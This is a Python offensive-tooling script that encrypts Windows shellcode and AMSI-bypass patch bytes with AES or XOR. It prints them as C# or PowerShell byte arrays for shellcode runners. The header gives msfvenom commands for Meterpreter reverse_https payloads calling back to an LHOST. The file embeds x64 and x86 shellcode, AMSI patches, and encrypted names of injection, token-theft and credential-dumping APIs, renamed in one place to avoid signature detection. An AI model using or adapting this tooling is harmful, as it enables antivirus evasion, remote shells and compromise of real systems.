from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from os import urandom
import argparse

# ------------------
# AesEncryptor.py 
# ------------------
# This helper program will print various api names, x64 & x86 shellcode, a key and an IV using Aes256 CBC Encryption for use with NetRunners C# or AES Encrypted PowerShell Shellcode Runners.
# Author: @gustanini (Rafael Pimentel)
# Hacker Hermanos: https://linktr.ee/hackerhermanos

# ------------------
# Instructions
# ------------------
# Generate your x64 payload, save as buf in configuration section below: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Generate your x86 payload, save as buf86 in configuration section below: msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 EXITFUNC=thread -f python
# Run this program selecting your desired format (currently csharp or powershell).

# ------------------
# Functions
# ------------------
class Encryptor:

    # generate aes initialization vector 16 byte
    @staticmethod
    def generate_iv_aes():
        return urandom(16)
    # generate aes key 32 byte
    @staticmethod
    def generate_key_aes():
        return urandom(32)
    # aes encryptor: 256CBC, PKCS7 padding
    @staticmethod
    def encrypt_bytes_to_bytes_aes(plain_bytes, aes_key, aes_iv):
        # Encrypts a byte array using AES encryption with the given key.

        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param aes_key: Byte array containing the encryption key.
        # :param aes_key: Byte array containing the initialization vector.
        # :return: Byte array containing the encrypted data.

        cipher = Cipher(algorithms.AES(aes_key), modes.CBC(aes_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_data = padder.update(plain_bytes) + padder.finalize()
        encrypted = encryptor.update(padded_data) + encryptor.finalize()
        return aes_iv + encrypted
    @staticmethod
    def encrypt_bytes_to_bytes_xor(plain_bytes, xor_key):
        # Encrypts a byte array using XOR encryption with the given key.
        
        # :param plain_bytes: Byte array containing the unencrypted byte[] to encrypt.
        # :param xor_key: Byte array containing the encryption key.
        # :return: Byte array containing the encrypted data.

        if not xor_key:
            raise ValueError("Key cannot be empty.")
        ciphertext_bytes = bytes([b ^ xor_key[i % len(xor_key)] for i, b in enumerate(plain_bytes)])
        return ciphertext_bytes

    # ------------------
    # POWERSHELL PRINTER
    # ------------------
    # printer, outputs to powershell format
    @staticmethod
    def to_powershell_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in powershell format
    @staticmethod
    def print_powershell():
        # print key, IV
        print(f"[Byte[]] $AesKey = {Encryptor.to_powershell_byte_array(aes_key)}")
        print(f"[Byte[]] $AesIV = {Encryptor.to_powershell_byte_array(aes_iv)}")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print(f"[Byte[]] $buf = {Encryptor.to_powershell_byte_array(encrypted_data)}")         

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print(f"[Byte[]] $buf86 = {Encryptor.to_powershell_byte_array(encrypted_data)}")       

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${patch_name} = {Encryptor.to_powershell_byte_array(encrypted_data)}")

        # api names
        API_NAME_MAP["AmsiSb"] = "AmsiScanBuffer".encode() # add amsiscanbuffer as "AmsiSb" to avoid sig detection

        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"[Byte[]] ${api_name.replace('.', '')}_Bytes = {Encryptor.to_powershell_byte_array(encrypted_data)}")

    # ------------------
    # CSHARP PRINTER
    # ------------------
    # printer, outputs to csharp format
    @staticmethod
    def to_csharp_byte_array(byte_data):
        return ', '.join(f'0x{b:02X}' for b in byte_data)
    # print in csharp format
    @staticmethod
    def print_csharp():
        # print key, IV
        print("public static byte[] AesKey =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_key)}" + "};")
        print("public static byte[] AesIv =" + "{" + f"{Encryptor.to_csharp_byte_array(aes_iv)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf, aes_key, aes_iv)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(buf86, aes_key, aes_iv)        
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(patch_bytes, aes_key, aes_iv)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_aes(api_bytes, aes_key, aes_iv)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP PRINTER (XOR)
    # ------------------
    # print in csharp format using xor encryption
    @staticmethod
    def print_csharp_xor():
        # print key, IV
        print("public static byte[] xor_key =" + "{" + f"{Encryptor.to_csharp_byte_array(xor_key)}" + "};")
        
        # print encrypted data
        # x64 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf, xor_key)
        print("public static byte[] buf =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # x86 C2 payload
        encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(buf86, xor_key)
        print("public static byte[] buf86 =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # print unencrypted buf sizes (encrypted buf size is different)
        print(f"public static int sBuf = {len(buf)};")
        print(f"public static int sBuf86 = {len(buf86)};")

        # amsi patches
        for patch_name, patch_bytes in AMSI_PATCH_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(patch_bytes, xor_key)
            print(f"public static byte[] {patch_name} =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

        # api names
        API_NAME_MAP["AmsiScanBuffer"] = "AmsiScanBuffer".encode() # add amsiscanbuffer for use with netrunners
        for api_name, api_bytes in API_NAME_MAP.items():
            encrypted_data = Encryptor.encrypt_bytes_to_bytes_xor(api_bytes, xor_key)
            print(f"public static byte[] {api_name.replace('.', '')}_Bytes =" + "{" + f"{Encryptor.to_csharp_byte_array(encrypted_data)}" + "};")

    # ------------------
    # CSHARP DELEGATE PRINTER
    # ------------------
    # print csharp delegates (getprocaddress, getmodulehandle)
    @staticmethod
    def print_csharp_delegates(pinvoke_signatures):
        for signature in pinvoke_signatures:
            lines = signature.split('\n')
            if len(lines) != 2:
                print("Invalid P/Invoke signature format. It should have exactly 2 lines.")
                continue
            
            # Parse DllImport lines
            attributes_line = lines[0].strip()
            method_signature = lines[1].strip()
            
            #method_parts = method_signature.split(' ')
            
            # Parse variables
            data_type = method_signature.split(" ")[3]
            api_name = method_signature.split(" ")[4].split("(")[0]
            parameters = method_signature.split("(")[1].split(")")[0]
            dll_name = attributes_line.split('"')[1]
            

            # Generate C# code
            delegate_code = (
                f"//// import {api_name.upper()}\n"
                f"public delegate {data_type} p{api_name}({parameters});\n"
                f"public static p{api_name} {api_name} = (p{api_name})Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle(\"{dll_name}\"), DecryptBytesToStringAes({api_name}_Bytes, AesKey)), typeof(p{api_name}));\n"
            )
            print(delegate_code)

# ------------------
# Configuration Section
# ------------------

# paste x64 buf here
buf =  b""
buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
buf += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
buf += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
buf += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
buf += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
buf += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
buf += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
buf += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
buf += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
buf += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
buf += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
buf += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
buf += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
buf += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
buf += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
buf += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

# paste x86 buf here as buf86
buf86 =  b""
buf86 += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
buf86 += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
buf86 += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
buf86 += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
buf86 += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
buf86 += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
buf86 += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
buf86 += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
buf86 += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
buf86 += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
buf86 += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
buf86 += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00"
buf86 += b"\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
buf86 += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
buf86 += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
buf86 += b"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65"
buf86 += b"\x00"

# amsi patches dictionary
AMSI_PATCH_MAP = {
    "AmsiPatch" : bytes([0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3]),
    "AmsiPatch86" : bytes([0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]) # this unencrypted payload is flagged
}

# api names
API_NAMES = [
    "VirtualAlloc",
    "VirtualProtect",
    "CreateThread",
    "WaitForSingleObject",
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "OpenProcess",
    "GetCurrentProcess",
    "FlsAlloc",
    "VirtualAllocExNuma",
    "CreateProcessA",
    "ZwQueryInformationProcess",
    "ReadProcessMemory",
    "ResumeThread",
    "LoadLibraryA",
    "GetStdHandle",
    "MiniDumpWriteDump",
    "amsi.dll",
    "NtTraceEvent",
    "CreateNamedPipeW",
    "ConnectNamedPipe",
    "ImpersonateNamedPipeClient",
    "GetCurrentThread",
    "OpenThreadToken",
    "GetTokenInformation",
    "ConvertSidToStringSidW",
    "DuplicateTokenEx",
    "CreateProcessWithTokenW"
]
API_NAME_MAP = {api: api.encode() for api in sorted(API_NAMES)}

pinvoke_signatures = [
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, int bInheritHandle, UInt32 processId);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);''',
    '''[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern int CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, int bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);''',
    '''[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern int ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr FlsAlloc(IntPtr lpCallback);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr LoadLibraryA(string name);''',
    '''[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern int VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetStdHandle(int nStdHandle);''',
    '''[DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateNamedPipeW(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);''',
    '''[DllImport("kernel32.dll")]
    public static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);''',
    '''[DllImport("advapi32.dll")]
    public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);''',
    '''[DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);''',
    '''[DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool ConvertSidToStringSidW(IntPtr pSID, out IntPtr ptrSid);''',
    '''[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);''',
    '''[DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);'''
]
pinvoke_signatures = sorted(pinvoke_signatures)

# ------------------
# Main Function
# ------------------
# Define a main function to handle argument parsing
def main():
    # Create the parser
    parser = argparse.ArgumentParser(description="Encryptor Script")
    # Add arguments
    parser.add_argument("-csharp", action="store_true", help="Print the output in C# format.")
    parser.add_argument("-csdelegates", action="store_true", help="Print win32 api delegates in C# format.")
    parser.add_argument("-powershell", action="store_true", help="Print the output in PowerShell format.")
    parser.add_argument("-xor", action="store_true", help="Print the output in C# format using XOR encryption.")

    # Parse the arguments
    args = parser.parse_args()

    if args.csharp:
        Encryptor.print_csharp()
    elif args.xor:
        Encryptor.print_csharp_xor()
    elif args.powershell:
        Encryptor.print_powershell()
    elif args.csdelegates:
        Encryptor.print_csharp_delegates(pinvoke_signatures)
    else:
        Encryptor.print_powershell()

if __name__ == "__main__":
    # generate keys
    aes_key = Encryptor.generate_key_aes()
    aes_iv = Encryptor.generate_iv_aes()
    xor_key = b".pdata"
    
    main()

# ------------------
# To-Do
# ------------------

# add -c format
# add -vba format (decimal)
# add powershell delegates
# refactor functions to make them more efficient/flexible